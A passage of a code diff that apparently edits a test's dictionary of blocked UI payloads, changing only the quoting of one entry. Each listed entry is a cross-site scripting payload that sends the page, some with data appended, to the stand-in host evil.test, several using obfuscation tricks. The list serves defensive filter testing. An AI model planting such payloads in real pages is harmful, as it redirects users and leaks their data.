@@ -195,7 +195,7 @@ BLOCKED_UI_PAYLOADS = {
     "plain location.href": '<script>location.href="https://evil.test/?d="+x</script>',
     "self.location": '<script>self.location="https://evil.test/?d="+x</script>',
     "with(window)": '<script>with(window){location="https://evil.test"}</script>',
-    "Function constructor": "<script>Function(\"l\",\"l.href='https://evil.test'\")(location)</script>",
+    "Function constructor": '<script>Function("l","l.href=\'https://evil.test\'")(location)</script>',
     "atob-built property": '<script>window[atob("bG9jYXRpb24=")]=x</script>',
     "setAttribute on a built anchor": (
         '<script>const a=document.createElement("a");'
